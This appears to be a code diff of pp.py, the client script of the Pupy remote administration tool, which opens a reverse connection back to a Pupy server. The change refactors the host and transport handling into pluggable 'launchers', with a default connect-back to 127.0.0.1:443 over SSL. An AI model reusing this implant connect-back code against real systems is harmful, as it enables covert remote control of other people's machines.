@@ -39,11 +39,14 @@ import ssl
 import random
 import imp
 import argparse
-from network.conf import transports
+from network import conf
+from network.base_launcher import LauncherError
 import logging
 import shlex
 logging.getLogger().setLevel(logging.INFO)
 
+LAUNCHER="simple" # the default launcher to start when no argv
+LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport tcp_ssl") # default launcher arguments
 
 
 class ReverseSlaveService(Service):
@@ -108,23 +111,16 @@ def add_pseudo_pupy_module(HOST):
 		mod.pseudo=True
 
 def main():
-	HOST="127.0.0.1:443"
-	TRANSPORTS=[("tcp_ssl",{}), ("tcp_ssl_proxy",{})]
+	global LAUNCHER
+	global LAUNCHER_ARGS
+
 	if len(sys.argv)>1:
 		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
-		parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default="tcp_ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
-		parser.add_argument('host', metavar='host:port', help='The address of the pupy server to connect to')
-		parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex for proxy transports: proxy_addr=192.168.0.1 proxy_port=8080 proxy_type=HTTP")
+		parser.add_argument('launcher', default="simple", choices=[x for x in conf.launchers], help="the launcher to use")
+		parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher arguments")
 		args=parser.parse_args()
-		HOST=args.host
-		TRANSPORTS=[(args.transport, {})]
-		args_dic={}
-		for val in shlex.split(' '.join(args.transport_args)):
-			tab=val.split("=",1)
-			if len(tab)!=2:
-				exit("Error: transport arguments must be in format NAME=VALUE or 'NAME=value with spaces'")
-			args_dic[tab[0].lower()]=tab[1]
-		TRANSPORTS[0][1].update(args_dic)
+		LAUNCHER=args.launcher
+		LAUNCHER_ARGS=shlex.split(' '.join(args.launcher_args))
 	if "windows" in platform.system().lower():
 		try:
 			import pupy
@@ -133,41 +129,25 @@ def main():
 			pupy.get_connect_back_host=(lambda: HOST)
 		except ImportError:
 			logging.warning("ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
-	else:
-		add_pseudo_pupy_module(HOST)
-	
+	#else:
+	#	add_pseudo_pupy_module(HOST)
 
+	if not LAUNCHER in conf.launchers:
+		exit("No such launcher: %s"%LAUNCHER)
+
+	launcher=conf.launchers[LAUNCHER]()
+	try:
+		launcher.parse_args(LAUNCHER_ARGS)
+	except LauncherError:
+		exit()
+	if "pupy" not in sys.modules:
+		add_pseudo_pupy_module(launcher.get_host())
+		
 	attempt=0
 	while True:
 		try:
-			print TRANSPORTS
-			for TRANSPORT,TRANSPORT_ARGS in TRANSPORTS:
+			for stream in launcher.iterate():
 				try:
-					rhost,rport=None,None
-					tab=HOST.rsplit(":",1)
-					rhost=tab[0]
-					if len(tab)==2:
-						rport=int(tab[1])
-					else:
-						rport=443
-					logging.info("connecting to %s:%s using transport %s ..."%(rhost, rport, TRANSPORT))
-					t=transports[TRANSPORT]
-					client_args=t['client_kwargs']
-					transport_args=t['client_transport_kwargs']
-					for val in TRANSPORT_ARGS:
-						if val.lower() in client_args:
-							client_args[val.lower()]=TRANSPORT_ARGS[val]
-						elif val.lower() in transport_args:
-							transport_args[val.lower()]=TRANSPORT_ARGS[val]
-						else:
-							logging.warning("unknown transport argument : %s"%tab[0])
-
-					logging.info("using client options: %s"%client_args)
-					logging.info("using transports options: %s"%transport_args)
-
-					client=t['client'](**client_args)
-					s=client.connect(rhost, rport)
-					stream = t['stream'](s, t['client_transport'], transport_args)
 					def check_timeout(event, cb, timeout=10):
 						start_time=time.time()
 						while True:
